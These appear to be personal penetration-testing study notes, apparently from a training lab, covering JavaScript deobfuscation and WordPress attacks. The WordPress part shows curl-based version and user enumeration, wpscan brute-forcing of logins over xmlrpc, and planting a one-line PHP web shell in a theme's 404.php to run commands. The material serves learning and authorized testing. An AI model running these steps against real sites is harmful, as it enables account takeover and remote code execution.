
# JavaScript Deobfuscate
  - [Make it pretty](https://prettier.io/playground/) --> then [unpack](https://matthewfl.com/unPacker.html)
  - Run Javacript console - https://jsconsole.com/

# WordPress Info (Use API token to get vuln details)
- https://github.com/wpscanteam/wpscan
- WordPress is written in PHP and usually runs on Apache with MySQL as the backend.
- Webroot located at /var/www/html
- Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.
- A Content Management Application (CMA) - the interface used to add and manage content. A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.
- Look for index.php, license.txt, wp-activate.php, /var/www/html/wp-includes, /var/www/html/wp-admin and /var/www/html/wp-content.
- WP has Admin, Editor, Author, Contributor, Subscriber roles. The admin user is usually assigned the user ID 1
- Look for `<meta name="generator" content="WordPress 5.3.3" />` (`curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'`)
- Look for particular plugins - `curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin` 404 if it doesnt exist
- `curl -s -X GET http://94.237.48.48:34933/wp-content/plugins/mail-masta/inc/flag.txt | html2text`
- User Enumeration - `curl -s -I http://blog.inlanefreight.com/?author=1` Usually admin, if not then 404
- WPSCAN enumeration - `wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>`
- > 4.7.1 wordpress user enumeration - `curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq`
- The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.
- `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`
- Modify template 404.php file with - `system($_GET['cmd']);` then `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`
